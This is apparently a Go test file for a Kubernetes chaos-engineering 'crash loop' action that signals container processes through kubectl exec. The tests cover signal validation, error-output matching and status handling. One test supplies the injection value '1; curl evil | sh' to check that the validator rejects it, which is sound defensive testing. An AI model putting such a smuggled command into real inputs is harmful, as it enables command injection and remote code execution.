// SPDX-License-Identifier: MIT
// SPDX-FileCopyrightText: 2025 Steadybit GmbH

package extpod

import (
	"context"
	"errors"
	"fmt"
	"maps"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/steadybit/action-kit/go/action_kit_api/v2"
	"github.com/steadybit/extension-kubernetes/v2/client"
	"github.com/steadybit/extension-kubernetes/v2/testutil"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	testclient "k8s.io/client-go/kubernetes/fake"
)

func Test_Prepare(t *testing.T) {
	type prepareTest struct {
		name                 string
		podSpecContainerName string
		podSpecHostPID       bool
		configContainer      string
		configSignal         string
		wantState            CrashLoopState
		wantErr              string
	}
	tests := []prepareTest{
		{
			name:                 "should fail if pod does not have container in spec",
			podSpecContainerName: "other",
			configContainer:      "example",
			wantErr:              "Container example not found in pod specification checkout-xyz1234",
		},
		{
			name:                 "should fail if pod has hostPID enabled",
			podSpecContainerName: "example",
			podSpecHostPID:       true,
			wantErr:              "Pod checkout-xyz1234 in namespace shop has hostPID enabled. This is not yet supported",
		},
		{
			name:                 "should reject a signal containing shell metacharacters",
			podSpecContainerName: "example",
			configSignal:         "1; curl evil | sh",
			wantErr:              `Invalid signal "1; curl evil | sh". Expected a signal number (e.g. 15) or name (e.g. SIGTERM).`,
		},
		{
			name:                 "should return state for all container",
			podSpecContainerName: "example",
			configSignal:         "15",
			wantState: CrashLoopState{
				Namespace: "shop",
				Pod:       "checkout-xyz1234",
				Signal:    "15",
			},
		},
		{
			name:                 "should return state for specific container",
			podSpecContainerName: "example",
			configContainer:      "example",
			configSignal:         "15",
			wantState: CrashLoopState{
				Namespace: "shop",
				Pod:       "checkout-xyz1234",
				Container: "example",
				Signal:    "15",
			},
		},
	}

	for _, signal := range []string{"9", "SIGKILL", "kill", "19", "SIGSTOP"} {
		tests = append(tests, prepareTest{
			name:                 "should reject signal " + signal,
			podSpecContainerName: "example",
			configSignal:         signal,
			wantErr:              fmt.Sprintf("Signal %q is not allowed. SIGKILL and SIGSTOP cannot be used for this attack.", signal),
		})
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Given
			stopCh := make(chan struct{})
			defer close(stopCh)
			testClient := getTestClient(stopCh, &corev1.Pod{
				TypeMeta: metav1.TypeMeta{
					Kind:       "Pod",
					APIVersion: "v1",
				},
				ObjectMeta: metav1.ObjectMeta{
					Name:      "checkout-xyz1234",
					Namespace: "shop",
				},
				Spec: corev1.PodSpec{
					HostPID: tt.podSpecHostPID,
					Containers: []corev1.Container{
						{Name: tt.podSpecContainerName},
					},
				},
			})

			assert.Eventually(t, func() bool {
				return testClient.PodByNamespaceAndName("shop", "checkout-xyz1234") != nil
			}, time.Second, 100*time.Millisecond)
			client.K8S = testClient

			request := action_kit_api.PrepareActionRequestBody{
				Config: map[string]any{
					"container": tt.configContainer,
					"signal":    tt.configSignal,
				},
				Target: new(action_kit_api.Target{
					Attributes: map[string][]string{
						"k8s.namespace": {"shop"},
						"k8s.pod.name":  {"checkout-xyz1234"},
					},
				}),
			}
			action := NewCrashLoopAction()
			state := action.NewEmptyState()

			// When
			_, err := action.Prepare(context.Background(), &state, request)

			// Then
			if tt.wantErr == "" {
				assert.Equal(t, tt.wantState, state)
				assert.NoError(t, err)
			} else {
				assert.EqualError(t, err, tt.wantErr)
			}
		})
	}
}

func Test_containerGone(t *testing.T) {
	// Outputs captured from kubectl exec against containers being killed by the crash loop attack (containerd, docker, cri-o).
	tests := []struct {
		name    string
		output  string
		notGone bool
	}{
		{name: "container not found", output: `error: Internal error occurred: unable to upgrade connection: container not found ("app")`},
		{name: "stopped state", output: `error: Internal error occurred: Internal error occurred: error executing command in container: failed to exec in container: failed to create exec "0123": cannot exec in a stopped state`},
		{name: "deleted state", output: `error: Internal error occurred: Internal error occurred: error executing command in container: failed to exec in container: failed to create exec "0123": cannot exec in a deleted state`},
		{name: "container exited", output: `error: Internal error occurred: Internal error occurred: error executing command in container: failed to exec in container: container is in CONTAINER_EXITED state`},
		{name: "task not found", output: `error: Internal error occurred: Internal error occurred: error executing command in container: failed to exec in container: failed to create exec "0123": task 0123abcdef not found`},
		{name: "container not created", output: `error: Internal error occurred: Internal error occurred: error executing command in container: failed to exec in container: failed to create exec "0123": container not created: not found`},
		{name: "no running task", output: `error: Internal error occurred: Internal error occurred: error executing command in container: failed to exec in container: failed to load task: no running task found: not found`},
		{name: "forbidden", output: `Error from server (Forbidden): pods "checkout-xyz1234" is forbidden: User "system:serviceaccount:steadybit:extension" cannot create resource "pods/exec"`, notGone: true},
		{name: "docker not running", output: `error: Internal error occurred: Internal error occurred: error executing command in container: failed to exec in container - Exec setup failed - Error response from daemon: container 0123abcdef is not running`},
		{name: "docker container not running", output: `error: Internal error occurred: Internal error occurred: error executing command in container: container not running (0123abcdef)`},
		{name: "docker init process", output: `FailedPrecondition: container 0123abcdef init process is not running: failed precondition`},
		{name: "cri-o not created or running", output: `error: Internal error occurred: Internal error occurred: error executing command in container: rpc error: code = NotFound desc = container is not created or running: checking if PID of 0123abcdef is running failed: container process not found`},
		{name: "cri-o not running", output: "the container `0123abcdef` is not running"},
		{name: "runc init process gone", output: `error: Internal error occurred: error executing command in container: failed to exec in container: failed to start exec "0123": OCI runtime exec failed: exec failed: unable to start container process: error executing setns process: exit status 1; runc init error(s): nsexec-1[2614443]: failed to open /proc/2504858/ns/ipc: No such file or directory; nsexec-0[2614442]: failed to sync with stage-1: next state (got 0 of 4 bytes)`},
		{name: "pod name containing task", output: `Error from server (NotFound): pods "task-worker-abc" not found`, notGone: true},
		{name: "kill not found", output: `OCI runtime exec failed: exec failed: unable to start container process: exec: "kill": executable file not found in $PATH`, notGone: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assert.Equal(t, !tt.notGone, containerGone.MatchString(tt.output))
		})
	}
}

const (
	killCommand      = "kubectl exec checkout-xyz1234 -c app -n shop -- kill -15 1"
	shellKillCommand = `kubectl exec checkout-xyz1234 -c app -n shop -- /bin/sh -c kill -"$1" 1 sh 15`
	setnsFailed      = `error: Internal error occurred: Internal error occurred: error executing command in container: failed to exec in container: failed to start exec "0123": OCI runtime exec failed: exec failed: unable to start container process: error executing setns process: exit status 1`
	initPipeBroken   = `error: Internal error occurred: Internal error occurred: error executing command in container: failed to exec in container: failed to start exec "0123": OCI runtime exec failed: exec failed: unable to start container process: error writing config to pipe: write init-p: broken pipe`
)

func Test_Status(t *testing.T) {
	originalTimeout, originalInterval, originalClient := containerSettleTimeout, containerSettleInterval, client.K8S
	t.Cleanup(func() {
		containerSettleTimeout, containerSettleInterval, client.K8S = originalTimeout, originalInterval, originalClient
	})
	containerSettleTimeout = 200 * time.Millisecond
	containerSettleInterval = 10 * time.Millisecond

	restarted := func(pod *corev1.Pod) *corev1.Pod {
		pod.Status.ContainerStatuses[0].ContainerID = "containerd://restarted"
		pod.Status.ContainerStatuses[0].RestartCount++
		return pod
	}
	terminated := func(pod *corev1.Pod) *corev1.Pod {
		pod.Status.ContainerStatuses[0].State = corev1.ContainerState{Terminated: &corev1.ContainerStateTerminated{ExitCode: 143}}
		return pod
	}
	deleted := func(*corev1.Pod) *corev1.Pod { return nil }

	recently := time.Now().Add(-2 * time.Second)
	aMinuteAgo := time.Now().Add(-time.Minute)

	tests := []struct {
		name string
		// podChange is applied after the first exec; returning nil deletes the pod.
		podChange          func(pod *corev1.Pod) *corev1.Pod
		gracePeriodSeconds *int64
		signalled          map[string]time.Time
		execOutputs        []string
		wantErr            string
		wantCommands       []string
		// wantSignalledAt is the time recorded for the container; zero expects the container to be signalled by this call.
		wantSignalledAt *time.Time
	}{
		{
			name:            "should kill pid 1",
			execOutputs:     []string{""},
			wantCommands:    []string{killCommand},
			wantSignalledAt: &time.Time{},
		},
		{
			name:            "should signal an already signalled container again",
			signalled:       map[string]time.Time{"containerd://initial": recently},
			execOutputs:     []string{""},
			wantCommands:    []string{killCommand},
			wantSignalledAt: &time.Time{},
		},
		{
			name:            "should forget signalled containers that are no longer running",
			signalled:       map[string]time.Time{"containerd://previous": recently},
			execOutputs:     []string{""},
			wantSignalledAt: &time.Time{},
		},
		{
			name:        "should ignore setns error without waiting when the container was signalled recently",
			signalled:   map[string]time.Time{"containerd://initial": recently},
			execOutputs: []string{setnsFailed},
			wantCommands: []string{
				killCommand,
				shellKillCommand,
			},
			wantSignalledAt: &recently,
		},
		{
			name:               "should ignore setns error within the pod's termination grace period",
			gracePeriodSeconds: new(int64(120)),
			signalled:          map[string]time.Time{"containerd://initial": aMinuteAgo},
			execOutputs:        []string{setnsFailed},
			wantSignalledAt:    &aMinuteAgo,
		},
		{
			name:        "should fail on setns error when the container keeps running after its termination grace period",
			signalled:   map[string]time.Time{"containerd://initial": aMinuteAgo},
			execOutputs: []string{setnsFailed},
			wantErr:     "restart count 3, last terminated at 2026-10-24T10:00:04Z with exit code 143, reason Error, last signalled at " + aMinuteAgo.UTC().Format(time.RFC3339) + ")",
		},
		{
			name:            "should retry via shell",
			execOutputs:     []string{`exec: "kill": executable file not found in $PATH`, ""},
			wantCommands:    []string{killCommand, shellKillCommand},
			wantSignalledAt: &time.Time{},
		},
		{
			name:         "should not record a container that is already gone as signalled",
			execOutputs:  []string{"cannot exec in a deleted state"},
			wantCommands: []string{killCommand},
		},
		{
			name:        "should ignore unknown exec error when the container was restarted meanwhile",
			podChange:   restarted,
			execOutputs: []string{"command terminated with exit code 137"},
		},
		{
			name:        "should ignore unknown exec error when the container terminated meanwhile",
			podChange:   terminated,
			execOutputs: []string{"error: error stream protocol error: unknown error"},
		},
		{
			name:        "should ignore setns error when the container terminated meanwhile",
			podChange:   terminated,
			execOutputs: []string{setnsFailed, initPipeBroken},
		},
		{
			name:        "should fail on setns error when the container keeps running",
			execOutputs: []string{setnsFailed},
			wantErr:     "error executing setns process: exit status 1 (container containerd://initial running since 2026-10-24T10:00:05Z, restart count 3, last terminated at 2026-10-24T10:00:04Z with exit code 143, reason Error, not signalled before)",
		},
		{
			name:        "should ignore unknown exec error when the pod is gone",
			podChange:   deleted,
			execOutputs: []string{"command terminated with exit code 137"},
		},
		{
			name:        "should fail on unknown exec error when the container keeps running",
			execOutputs: []string{"command terminated with exit code 137"},
			wantErr:     "kubectl exec failed for container app in pod shop/checkout-xyz1234",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			stopCh := make(chan struct{})
			defer close(stopCh)
			pod := &corev1.Pod{
				ObjectMeta: metav1.ObjectMeta{Name: "checkout-xyz1234", Namespace: "shop"},
				Spec:       corev1.PodSpec{Containers: []corev1.Container{{Name: "app"}}, TerminationGracePeriodSeconds: tt.gracePeriodSeconds},
				Status: corev1.PodStatus{
					ContainerStatuses: []corev1.ContainerStatus{{
						Name:         "app",
						ContainerID:  "containerd://initial",
						RestartCount: 3,
						State:        corev1.ContainerState{Running: &corev1.ContainerStateRunning{StartedAt: metav1.Date(2026, 10, 24, 10, 0, 5, 0, time.UTC)}},
						LastTerminationState: corev1.ContainerState{Terminated: &corev1.ContainerStateTerminated{
							ExitCode:   143,
							Reason:     "Error",
							FinishedAt: metav1.Date(2026, 10, 24, 10, 0, 4, 0, time.UTC),
						}},
					}},
				},
			}
			cs := testclient.NewClientset(pod)
			client.K8S = client.CreateClient(cs, stopCh, "", client.MockAllPermitted(), testutil.NewFakeDynamicClient())

			var commands []string
			stubRunCommand(t, func(cmd []string) ([]byte, error) {
				commands = append(commands, strings.Join(cmd, " "))
				output := tt.execOutputs[min(len(commands), len(tt.execOutputs))-1]
				if output == "" {
					return nil, nil
				}
				if tt.podChange != nil && len(commands) == 1 {
					if changed := tt.podChange(pod.DeepCopy()); changed != nil {
						_, err := cs.CoreV1().Pods("shop").UpdateStatus(context.Background(), changed, metav1.UpdateOptions{})
						require.NoError(t, err)
					} else {
						require.NoError(t, cs.CoreV1().Pods("shop").Delete(context.Background(), "checkout-xyz1234", metav1.DeleteOptions{}))
					}
				}
				return []byte(output), errors.New("exit status 1")
			})

			state := &CrashLoopState{Namespace: "shop", Pod: "checkout-xyz1234", Signal: "15", SignalledContainers: tt.signalled}
			start := time.Now()
			_, err := NewCrashLoopAction().(CrashLoopAction).Status(context.Background(), state)
			elapsed := time.Since(start)

			if tt.wantErr == "" {
				assert.NoError(t, err)
			} else {
				assert.ErrorContains(t, err, tt.wantErr)
			}
			if tt.wantCommands != nil {
				assert.Equal(t, tt.wantCommands, commands)
			}
			if tt.wantSignalledAt == nil && tt.wantErr == "" {
				assert.Empty(t, state.SignalledContainers)
			}
			if tt.wantSignalledAt != nil {
				assert.Equal(t, []string{"containerd://initial"}, slices.Collect(maps.Keys(state.SignalledContainers)))
				signalledAt := state.SignalledContainers["containerd://initial"]
				if tt.wantSignalledAt.IsZero() {
					assert.False(t, signalledAt.Before(start), "should be signalled by this call")
				} else {
					assert.True(t, tt.wantSignalledAt.Equal(signalledAt), "should keep the previous signal time")
					assert.Less(t, elapsed, containerSettleTimeout, "should skip without waiting for the container to stop")
				}
			}
		})
	}
}

func stubRunCommand(t *testing.T, fn func(cmd []string) ([]byte, error)) {
	original := runCommand
	t.Cleanup(func() { runCommand = original })
	runCommand = func(_ context.Context, name string, args ...string) ([]byte, error) {
		return fn(append([]string{name}, args...))
	}
}
